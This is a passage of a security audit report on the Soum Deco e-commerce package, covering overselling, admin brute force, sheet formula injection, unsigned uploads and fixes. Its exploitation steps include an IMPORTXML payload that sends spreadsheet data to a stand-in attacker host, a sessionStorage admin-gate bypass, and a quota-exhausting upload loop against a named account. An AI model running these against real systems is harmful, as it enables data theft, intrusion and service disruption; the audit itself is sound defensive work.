@@ -1,0 +1,423 @@
+=== PAGE 11 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+H-04 Stock can be oversold: all four prevention layers are client-side, decrement is
+deferred
+Severity High Confidence Confirmed
+Location src/components/site/checkout-modal.tsx (variant check); apps-script.gs:1146-1177 (decrement only when admin sets
+Confirmed), 550-553 and 1115-1116 (multi-item orders skipped)
+apps-script.gs: if (productName.indexOf('+') >= 0) { skipped++; continue; }
+// multi-item orders NEVER stock-sync (documented limitation)
+// stock decremented only when status -> confirmed/shipped/delivered
+// all 'rupture' checks (button disable, cart clear, checkout block)
+// run in the browser and are bypassable by direct API calls
+Why it is a flaw. Stock is not reserved at order time; it is decremented only when the store owner later flips
+the order status to Confirmed. Every guard that prevents ordering an out-of-stock item runs in the browser
+(disabled buttons, cart pruning, checkout blocking), and the public order endpoint performs no stock check at
+all. Between order placement and confirmation, any number of concurrent orders can exceed the remaining
+stock, and multi-item orders (whose product field contains a plus sign) are never stock-synced at all by explicit
+design.
+Impact. Overselling: customers order and pay on delivery for items that are no longer in stock, creating
+refunds, re-deliveries and reputational damage; inventory silently drifts from reality for multi-item orders.
+Trigger / exploitation. Open two sessions, both order the last in-stock unit before the admin confirms either
+order; both succeed. Or call the order endpoint directly several times ignoring the UI entirely.
+Required fix. Add a server-side stock check (and ideally a soft reservation) in doCreateOrderFromParams,
+and split multi-item orders into per-item rows so the stock trigger can process them.
+H-05 Admin login can be brute-forced, and the UI gate is bypassable via
+sessionStorage
+Severity High Confidence Confirmed
+Location src/app/api/admin/route.ts:127-163 (no rate limit, no lockout); src/components/site/admin-panel.tsx:1483
+(sessionStorage flag = auth)
+admin/route.ts login action: constant-time compare, but
+no attempt counter, no IP throttle, no lockout, no captcha
+admin-panel.tsx:1483:
+if (sessionStorage.getItem(SESSION_KEY) === '1') setAuthed(true);
+// SESSION_KEY = 'soumdeco_admin_authed' - settable from devtools
+Why it is a flaw. The login endpoint applies constant-time comparison but nothing else: an attacker can
+attempt unlimited passwords at full speed. Separately, the panel treats the sessionStorage flag
+'soumdeco_admin_authed = 1' as proof of authentication for the UI, and this flag is trivially set from the
+browser console. The panel then renders with full editing capabilities; writes still require the admin token, but
+Z.ai - Principal Audit Series 9
+
+=== PAGE 12 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+with C-02 the token is one login away, and the flag bypass exposes the panel surface (product data, stock
+values, image preview) to anyone.
+Impact. Practical brute-force of weak passwords (the shipped one is a dictionary word plus digits), and
+unauthenticated access to the admin panel UI and its data displays.
+Trigger / exploitation. Loop POST /api/admin {action:'login', password:} - unlimited attempts. Or:
+sessionStorage.setItem('soumdeco_admin_authed','1') then open /#admin.
+Required fix. Add per-IP and per-account rate limiting with exponential backoff on the login action; replace
+the '1' flag with validation of the signed session token before rendering the panel.
+5. Medium-Severity Findings
+These findings degrade integrity, mislead the operator, or enlarge the attack surface without granting
+immediate destruction. Several of them are load-bearing for the replication package's stated purpose: a buyer
+of this kit will follow documentation that is wrong, run tests that do not test the shipped code, and inherit
+dependencies the site never uses.
+M-01 Google Sheets formula injection through customer-controlled order fields
+Severity Medium Confidence Confirmed
+Location apps-script.gs:684-692 (appendRow with raw p.fullName / p.notes / p.wilaya / p.commune)
+sheet.appendRow([ new Date(), 'New', productStr, ...,
+p.fullName || '', p.phone || '', p.wilaya || '', p.commune || '',
+..., notesStr, variantStr, stockKeyStr, '' ]);
+// no sanitization: a fullName of '=IMPORTXML(...)' becomes a live formula
+Why it is a flaw. Values typed by the customer are written verbatim into spreadsheet cells. Google Sheets
+interprets any cell value that begins with '=', '+', '-' or '@' as a formula when written through appendRow. A
+malicious customer can therefore submit a name or note such as =IMPORTXML("http://attacker/","//a") or
+=HYPERLINK(...) and have it execute inside the store owner's spreadsheet the moment the sheet recalculates
+or the owner clicks it.
+Impact. Data exfiltration from the spreadsheet, misleading links presented to the owner inside their own
+operational tool, and potential propagation if the sheet is later exported.
+Trigger / exploitation. Place an order with fullName =
+'=IMPORTXML("http://evil.example/?x="&A2;,"//")'. When the owner opens the Orders tab, the formula
+fetches attacker URLs with cell content appended.
+Required fix. Sanitize all user-supplied values before appendRow: prefix dangerous leading characters with
+an apostrophe, or store an underscore-prefixed copy and strip it in any downstream processing.
+Z.ai - Principal Audit Series 10
+
+=== PAGE 13 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+M-02 Documentation and configuration contradict the shipped code
+Severity Medium Confidence Confirmed
+Location README.md (Next.js 16, '6-layer defense', 'never in client bundle'); package.json:3,60 (next 15.5.2, scaffold name);
+wrangler.toml comment ('3-minute TTL') vs worker/data-sync.js:83 (KV_TTL_SECONDS = 3600)
+README.md: 'Next.js 16 + TypeScript + Tailwind 4'
+package.json: "next": "^15.5.2", "name": "nextjs_tailwind_shadcn_ts"
+wrangler.toml: 'KV namespace - Product + Stock cache (3-minute TTL)'
+worker/data-sync.js: const KV_TTL_SECONDS = 3600; // actually 1 hour
+Why it is a flaw. Multiple factual claims in the documentation are false against the code that ships next to
+them: the framework version, the security guarantees (see C-02), the cache TTL, and the project identity (the
+package.json name is still the generic scaffold name). For a package whose explicit purpose is to let a
+non-expert replicate and operate the site, wrong operational documentation is not cosmetic - it drives wrong
+setup decisions and wrong incident response.
+Impact. Operators tune freshness and debugging expectations against wrong numbers; security assumptions
+are misplaced (the strongest claims are the false ones); brand confusion in tooling.
+Trigger / exploitation. Direct comparison of README/wrangler comments with package.json and worker
+code.
+Required fix. Correct the README and wrangler comments, rename the package, and add a CI check that
+greps docs for version claims against package.json.
+M-03 /api/shipping calls an Apps Script action that does not exist
+Severity Medium Confidence Confirmed
+Location src/app/api/shipping/route.ts:9-20 (calls ?action=shipping); apps-script.gs:102-128 (doGet has no 'shipping' branch)
+shipping/route.ts: const url = `${base}?action=shipping`;
+apps-script.gs doGet: handles stock | products | order | health |
+statistics | process_confirmed | product_delete | product_reset |
+dedupe | cleanup -> 'shipping' falls to 'unknown action'
+Response: {ok:false, error:'unknown action: shipping'} -> parsed as []
+Why it is a flaw. The shipping route requests an action the backend never implements, so the endpoint can
+only ever return an empty shipping list with source 'sheet'. The real shipping prices live in a hardcoded table in
+src/lib/shipping.ts, which the frontend uses directly. This is dead integration code that looks alive: it returns
+HTTP 200, reports source 'sheet', and silently masks the fact that the sheet was never consulted.
+Impact. No functional impact today (the hardcoded table carries the site), but the endpoint misleads operators
+into believing shipping prices are sheet-driven; any future edit to the sheet will never reach customers.
+Trigger / exploitation. curl https:///api/shipping - always returns an empty array despite a populated Sheet.
+Z.ai - Principal Audit Series 11
+
+=== PAGE 14 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+Required fix. Either implement a shipping tab in the Apps Script or delete the route and document that
+shipping prices are code-owned constants.
+M-04 TypeScript build errors are silently ignored
+Severity Medium Confidence Confirmed
+Location next.config.ts:5-8 (typescript.ignoreBuildErrors = true); tsconfig.json (noImplicitAny = false)
+next.config.ts: typescript: { ignoreBuildErrors: true },
+tsconfig.json: "noImplicitAny": false,
+// the project's own docs/CODE-AUDIT-REPORT.md flagged this as P1
+// in a previous internal audit - still present in this package
+Why it is a flaw. The build is configured to ignore TypeScript errors entirely, and implicit-any is permitted.
+Combined with the large amount of untyped 'any' handling in data-normalization paths
+(normalizeSheetProduct and friends), type regressions in the money-critical order flow can ship to production
+invisibly. The project's own internal audit already flagged this and the flag was never removed.
+Impact. Latent runtime defects in production (the exact class of bug the type system exists to catch), and a
+false sense of safety from 'TypeScript: 0 errors' claims in the WORKLOG.
+Trigger / exploitation. Introduce a type error in any source file and run the production build - it succeeds.
+Required fix. Remove ignoreBuildErrors, set noImplicitAny true, and fix the resulting errors incrementally
+(start with lib/ and api/ where money flows).
+M-05 Test suite validates a mirror copy of the logic, and one verifier is
+machine-bound
+Severity Medium Confidence Confirmed
+Location scripts/test-comprehensive.js:54-100 (re-implemented parseVariantContent_ etc.); scripts/verify-apps-script.js:8-11
+(hardcoded absolute paths)
+// MIRROR OF apps-script.gs HELPERS (extraction + decrement)
+function parseVariantContent(content) { ... } // copied by hand
+verify-apps-script.js:
+const files = ['/home/z/my-project/download/apps-script.gs',
+'/home/z/my-project/upload/apps-script.gs'];
+Why it is a flaw. The 212 'comprehensive' checks run against a hand-copied duplicate of the Apps Script
+helper functions, not against the shipped apps-script.gs. If the real file drifts from the mirror, the suite keeps
+passing while production behavior changes. Additionally, verify-apps-script.js reads hardcoded absolute paths
+from the original developer's machine, so the 'syntax check' step fails for every other user of the package
+(confirmed during this audit: the script crashed with ENOENT).
+Z.ai - Principal Audit Series 12
+
+=== PAGE 15 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+Impact. False confidence: green tests do not describe shipped behavior; a broken replication workflow for the
+new owner (the README instructs running this verifier as step one).
+Trigger / exploitation. Change a stock-key separator in apps-script.gs but not in the test mirror - all 212
+checks still pass. Run node scripts/verify-apps-script.js on any machine other than the original author's - it
+throws.
+Required fix. Load the .gs file at runtime in the tests (parse once, extract the functions) and resolve paths
+relative to the script directory (__dirname/..).
+M-06 Thirteen-plus unused heavyweight dependencies inflate attack surface and
+build time
+Severity Medium Confidence Confirmed
+Location package.json:16-98; verified by import scan of src/
+next-auth, @tanstack/react-query, @tanstack/react-table, recharts,
+@mdxeditor/editor, @dnd-kit/* (3 pkgs), react-syntax-highlighter,
+next-intl, uuid, date-fns, input-otp, vaul, embla-carousel-react,
+z-ai-web-dev-sdk -> zero imports anywhere in src/
+prisma + @prisma/client: only referenced by the unused src/lib/db.ts
+Why it is a flaw. Roughly a third of the 64 declared dependencies are never imported by any shipped code
+(left over from the scaffold). Each unused package still gets installed, audited, and bundled-scanned, enlarging
+the dependency graph that a supply-chain attack can hide in, slowing every build, and confusing the next
+maintainer about what the site actually needs. The README presents '64 packages' as a feature rather than a
+liability.
+Impact. Larger install/build surface, slower CI, more CVE noise, and a misleading dependency inventory for
+the replication package.
+Trigger / exploitation. rg -l '' src/ returns nothing for each listed dependency.
+Required fix. Remove the unused dependencies (and src/lib/db.ts with prisma) from package.json; keep only
+what the bundle actually imports.
+M-07 Public unsigned Cloudinary preset allows anyone to fill the image storage
+quota
+Severity Medium Confidence Confirmed
+Location src/lib/client-sheet.ts:468-560 (clientUploadImage, unsigned upload); .env.example
+(NEXT_PUBLIC_CLOUDINARY_*); README Step 3
+formData.append('upload_preset', UPLOAD_PRESET); // 'soumdeco'
+// unsigned upload - by design, so the browser can upload directly
+// cloud name 'anhvhy4j' is public in the client bundle
+Z.ai - Principal Audit Series 13
+
+=== PAGE 16 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+Why it is a flaw. The image pipeline relies on an unsigned upload preset, meaning the Cloudinary account
+accepts uploads from anyone who knows the public cloud name and preset - both of which ship in the client
+bundle and the README. There is no server-side gate, no file-type check beyond Cloudinary's defaults, and
+no rate limit. The 25 GB free-tier storage that the product images depend on can be consumed by a script in an
+afternoon.
+Impact. Storage-exhaustion attack: once the quota is hit, the admin can no longer upload product images and
+the daily image sync pipeline breaks, degrading the storefront over time.
+Trigger / exploitation. Loop POST https://api.cloudinary.com/v1_1/anhvhy4j/image/upload with the public
+preset and arbitrary files until the account is full.
+Required fix. Switch to signed uploads from an edge route (the signing secret stays server-side), enforce file
+type and size limits, and set a Cloudinary upload-rate alert.
+M-08 Worker CORS allowlist omits custom domains, and /refresh throttling is
+keyed to cron activity
+Severity Medium Confidence Likely
+Location worker/data-sync.js:41-47 (ALLOWED_ORIGINS), 130-145 (rate limit reads __meta.lastSyncAttempt)
+const ALLOWED_ORIGINS = new Set([
+'https://soumdeco.pages.dev', 'https://www.soumdeco.pages.dev',
+'http://localhost:3000', 'http://127.0.0.1:3000', ]);
+// refresh cooldown reads meta.lastSyncAttempt - also written by cron
+Why it is a flaw. The Worker only allows the pages.dev hostnames and localhost. If the store is ever moved to
+a custom domain (a natural next step for a real shop), direct browser calls to the Worker - health checks in the
+admin panel - will fail CORS. Separately, the /refresh cooldown compares against lastSyncAttempt, which the
+5-minute cron also updates, so an admin refresh issued shortly after a cron run is spuriously rejected as
+rate-limited; the client masks this as success.
+Impact. Broken worker health/status panel on any future custom domain; occasional silently-ignored manual
+refreshes that confuse admin workflows.
+Trigger / exploitation. Call /api/refresh within 3 seconds of a cron sync - returns rate_limited although the
+caller did nothing wrong.
+Required fix. Add the production custom domain to the allowlist (or read it from env), and track the last
+manual refresh in a separate KV key from cron updates.
+Z.ai - Principal Audit Series 14
+
+=== PAGE 17 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+6. Low-Severity Findings
+These are correctness and hygiene defects with narrow blast radius. They are recorded because each has been
+verified to occur under realistic conditions, and because two of them (legacy stock keys and the
+quantity-suffix regex) will quietly corrupt inventory records over time.
+L-01 Quantity-stripping regex can truncate legitimate product names ending in 'x'
++ digits
+Severity Low Confidence Confirmed
+Location apps-script.gs:313, 557, 1118 (regex: strip trailing 'x' or multiplication sign + digits)
+var bareName = productName.replace(/\s*[x\u00d7]\s*\d+\s*$/, '').trim();
+// a product genuinely named 'Pack x2' is reduced to 'Pack'
+// -> stock key no longer matches the Stock tab row 'Pack x2'
+Why it is a flaw. Order rows store quantities as a suffix (for example 'Product x3'), and the backend strips
+that suffix with a broad regex before matching stock keys. Any product whose real name ends with 'x'
+followed by digits (sizes like 'x2', model numbers like 'Table x4') gets truncated, so its stock row never
+matches and its inventory is never decremented.
+Impact. Silent stock drift for affected products; the out-of-stock display and the sheet disagree over time.
+Trigger / exploitation. Create a product named 'Pack x2', sell it, confirm the order - the 'Pack x2' Stock row
+is untouched.
+Required fix. Send quantity as a separate sheet field (it already exists) and stop encoding it into the product
+name; keep the stripping only as a legacy fallback for old rows.
+L-02 process_confirmed and statistics are public unauthenticated actions
+Severity Low Confidence Confirmed
+Location apps-script.gs:111-112 (public section of doGet)
+if (action === 'statistics') return setupStatistics();
+if (action === 'process_confirmed') return doProcessConfirmedFromUrl();
+// both mutate/rebuild the spreadsheet - no isAuthorized_ check
+Why it is a flaw. Two write-capable actions sit in the public section of the dispatcher, contradicting the file's
+own 'writes require token' rule. process_confirmed scans and batch-writes the Orders and Stock tabs; statistics
+clears and rebuilds the Statistics tab. They are abusable as load generators against the Apps Script quota and
+can interfere with the owner's spreadsheet state.
+Impact. Remote-triggered heavy sheet operations; quota burn; nuisance rebuilds of the Statistics tab.
+Z.ai - Principal Audit Series 15
+
+=== PAGE 18 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+Trigger / exploitation. curl '?action=statistics' repeatedly - the Statistics sheet is cleared and rebuilt each
+time.
+Required fix. Move both actions behind isAuthorized_ and keep them menu-only.
+L-03 Arabic-primary store renders inside an LTR document root
+Severity Low Confidence Confirmed
+Location src/app/layout.tsx:89 (html lang='ar' dir='ltr')
+// UI copy, forms and checkout are Arabic; RTL is simulated per-component
+Why it is a flaw. The document root declares left-to-right direction while the store's primary language and
+checkout flow are Arabic. Component-level classes compensate visually, but mixed-direction text (Arabic
+product names containing Latin codes, phone numbers, totals) is rendered with the wrong base direction,
+which commonly produces misplaced punctuation, mirrored brackets, and confusing number ordering at
+exactly the money-critical moments.
+Impact. Subtle reading errors in order details for Arabic-first customers; accessibility tools announce the page
+direction incorrectly.
+Trigger / exploitation. Inspect any order summary containing Latin digits and Arabic labels side by side.
+Required fix. Set dir='rtl' on the root and scope dir='ltr' to the few Latin-only components, or use the CSS
+logical-property utilities Tailwind provides.
+L-04 Order timestamps depend on the script's unpinned timezone
+Severity Low Confidence Likely
+Location apps-script.gs:684 (new Date() in appendRow); no appsscript.json manifest in the package
+sheet.appendRow([ new Date(), 'New', ... ]);
+// Apps Script project timezone is not pinned anywhere in the zip
+Why it is a flaw. Order dates are written using the Apps Script project's timezone, and the package contains
+no appsscript.json manifest to pin it. A replication by a new owner (a different Google account, possibly a
+different locale) can silently shift all order times by hours, which matters for a shop whose analytics compare
+daily order volume.
+Impact. Mis-dated orders near midnight; confusing daily statistics after replication.
+Trigger / exploitation. Deploy the script in an account whose default timezone differs from the original, then
+compare order dates with the customer's local time.
+Required fix. Ship an appsscript.json with an explicit timeZone, or write dates as formatted strings in UTC+1
+(Algeria) from a fixed offset.
+Z.ai - Principal Audit Series 16
+
+=== PAGE 19 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+L-05 Reversed QUERY ranges and fragile constructs in the statistics builder
+Severity Low Confidence Confirmed
+Location apps-script.gs:1036, 1044 (QUERY(Orders!J2:G, ...)), 726 (row-1 Arabic skip hack)
+val(24,1,'=IFERROR(QUERY(Orders!J2:G, "SELECT J, COUNT(J), SUM(G) ...'
+// J2:G is a reversed range - Sheets normalizes it, but it is fragile
+serveStock: if (i === 1 && /Arabic regex/.test(String(r[0]))) continue;
+Why it is a flaw. The statistics formulas use reversed A1 ranges (J2:G instead of G2:J) that happen to be
+normalized by Sheets, plus a hardcoded skip of row 2 when it contains Arabic characters to suppress a legacy
+guidance row. Both constructs work today but depend on undocumented normalization and on the guidance
+row staying exactly where it is.
+Impact. Statistics sections silently show 'Aucune commande' if a future Sheets update stops normalizing;
+stock parsing breaks if the guidance row moves.
+Trigger / exploitation. None required - code inspection; verified against Sheets normalization behavior.
+Required fix. Rewrite ranges in canonical order (G2:J) and replace the row-skip hack with an explicit
+header/flag check.
+L-06 Legacy comma-format stock keys are treated as single keys forever
+Severity Low Confidence Confirmed
+Location apps-script.gs:429-449 (splitStockKey_ refuses to split on commas)
+// NEVER splits on ',' - product names can contain commas
+if (s.indexOf(';') >= 0) return s.split(';');
+return [s]; // single key (even if it contains commas)
+Why it is a flaw. Historical orders recorded multi-variant stock keys with comma separators before the
+semicolon migration. The current parser deliberately never splits them, so those legacy keys can never match
+per-variant stock rows. The design assumes the admin will reprocess old orders via the menu action, but
+nothing in the UI prompts this after replication.
+Impact. A small set of legacy orders silently never decrement stock after the package is reused.
+Trigger / exploitation. Inspect any pre-migration order row with a comma stock key and confirm its status
+flip does not decrement anything.
+Required fix. Add a one-time migration that rewrites comma keys for rows whose product name contains no
+commas, or surface a replication checklist step that runs the reprocessor.
+Z.ai - Principal Audit Series 17
+
+=== PAGE 20 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+L-07 Worker change detection relies on a 32-bit hash with realistic collision odds
+Severity Low Confidence Confirmed
+Location worker/data-sync.js:72-80 (hashString, djb2)
+function hashString(s) { let h = 5381;
+for (let i = 0; i < s.length; i++)
+h = ((h << 5) + h + s.charCodeAt(i)) | 0;
+return String(h >>> 0); } // 32-bit djb2
+Why it is a flaw. Catalog change detection compares 32-bit djb2 hashes of the products and stock payloads.
+For inputs of this size, accidental collisions are unlikely but not negligible, and a collision would make the
+Worker skip a legitimate update until the next TTL-driven rewrite (up to one hour of staleness). A
+cryptographic digest would remove the ambiguity at negligible cost.
+Impact. Rare one-hour windows where a changed catalog is not refreshed on change-detection grounds.
+Trigger / exploitation. Constructing a deliberate collision is impractical for an outsider; the risk is accidental
+staleness only.
+Required fix. Replace djb2 with a SHA-256 digest via crypto.subtle (available in the Worker runtime).
+7. Consolidated Fix Roadmap
+The roadmap below orders the remediation work by urgency. P0 items are the minimum needed to make the
+live deployment defensible and are sized for a single focused day: rotate every shipped credential, close the
+two unauthenticated write paths, and make the Apps Script fail closed. P1 items restore the integrity of the
+order pipeline and the durability of the data plane over the following week. P2 hardening and P3 hygiene can
+follow in normal maintenance cadence. Fixing P0 without fixing P1 still leaves the store recording fraudulent
+orders, so the two windows should be planned together.
+Priority Window Actions
+P0 Same day - before next C-01, C-03: rotate all secrets (password, admin token, signing key, Telegram bot,
+customer new Apps Script deployment URL); set the Apps Script admin token and make
+isAuthorized_ fail closed. C-02: remove the password from brand-config and the
+client-side login fallback. C-04: disable the write methods on /api/products. C-06:
+revoke the bot token and strip the hardcoded fallback.
+P1 This week C-05: server-side recomputation and validation of order totals and quantities (edge
+route and Apps Script). H-01: require the admin session on /api/refresh. H-02:
+convert order submission to POST with anti-spam controls and stop transmitting
+PII in URLs. H-03: honest failure UX, admin visibility of the failed-order queue,
+notification only on confirmed writes. H-04: server-side stock check at order time.
+H-05: login rate limiting; replace the sessionStorage auth flag with signed-session
+validation.
+Z.ai - Principal Audit Series 18
+
+=== PAGE 21 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+Priority Window Actions
+P2 This month M-01: sanitize sheet-bound customer fields against formula injection. M-05: tests
+must load the shipped apps-script.gs, and verify-apps-script.js must resolve paths
+portably. M-06: prune the unused dependency set. M-07: signed Cloudinary
+uploads from an edge route. M-03, M-08: remove the dead shipping route; fix
+Worker CORS and refresh throttling. M-02: correct the documentation and
+rename the package.
+P3 Hygiene backlog M-04: re-enable TypeScript build errors and strict null checks. L-01 through L-07:
+quantity suffix migration, protected statistics actions, RTL document root, pinned
+script timezone, canonical QUERY ranges, legacy stock-key migration, SHA-256
+change detection.
+Table 7-1. Prioritized remediation roadmap consolidating all 26 findings.
+Two remediation notes deserve emphasis. First, rotation must be complete, not partial: the leaked
+SESSION_SIGNING_KEY is enough to forge sessions even after the password changes, and the leaked Apps
+Script URL survives password rotation because the token on the old deployment was never set. Second, the
+fail-open authorization cannot be fixed on the front end alone; the isAuthorized_ function in the Apps Script
+is the authoritative gate and must be fixed there, then verified by attempting an unauthenticated write from an
+incognito browser before the store is announced as safe.
+8. Verified Sound Areas
+An audit that only lists failures teaches the owner where not to look; this chapter records where the package
+demonstrably holds, so remediation does not accidentally discard working engineering. Each item below was
+verified against the code during this audit, not taken from the project's own documentation.
+1. Read-path resilience is genuinely well engineered: the fallback chain (Worker KV, static JSON,
+localStorage cache, seed data) has timeouts on every fetch, per-source caches, and zero-error handling, so a
+visitor always gets a rendered storefront even when every backend is down.
+2. The server-side session implementation in /api/admin is correct as written: HMAC-SHA256 signing,
+constant-time signature verification, and 8-hour expiry are all implemented properly - the problems are the
+leaked signing key (C-01) and the missing rate limiting (H-05), not the cryptography.
+3. All 286 declared test checks pass (212 + 74 across the nine suites), apps-script.gs parses as valid
+JavaScript (1,439 lines), and the bundled data files (products.json, stock-seed.json, image-manifest.json)
+are valid, consistent JSON.
+4. No cross-site-scripting vectors were found: the only dangerouslySetInnerHTML usage is a static,
+code-owned JSON-LD block in layout.tsx; all product and order data flows into text nodes.
+5. The .gitignore excludes .env files and no real .env file ships in the zip - the secret exposure comes from
+hardcoded values and SECRETS.txt, not from committed env files.
+Z.ai - Principal Audit Series 19
+
+=== PAGE 22 ===
+SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
+6. Cart state handling is defensive: localStorage corruption is self-healed, quantities are sanitized on load,
+orphan items whose products were deleted are pruned on catalog refresh, and the add-to-cart path survives
+a corrupted store.
+7. The Cloudflare Worker's cron is exception-safe (never throws out of scheduled), retries Apps Script
+fetches with backoff, skips 4xx responses, and its KV write pattern is quota-aware (change detection plus
+TTL refresh).
+8. Several defects flagged in the project's own earlier internal audit were verified as fixed in this package:
+the featured-carousel out-of-bounds crash now has a guard, admin saves are awaited with rollback, and the
+base64-image overflow path returns empty strings instead of overflowing sheet cells.
+The overall pattern is a codebase with two distinct personalities. The read path - the part a visitor experiences -
+is engineered with unusual care: layered fallbacks, timeouts on every hop, self-healing caches, and defensive
+parsing throughout. The write path - the part that touches money, inventory, and administration - is where
+nearly every finding lives: trust boundaries asserted in comments rather than enforced in code, fail-open gates,
+and secrets used as configuration. Remediation should therefore be surgical: preserve the read-path
+architecture as-is, and rebuild the trust boundaries of the write path from the Apps Script outward.
+Z.ai - Principal Audit Series 20
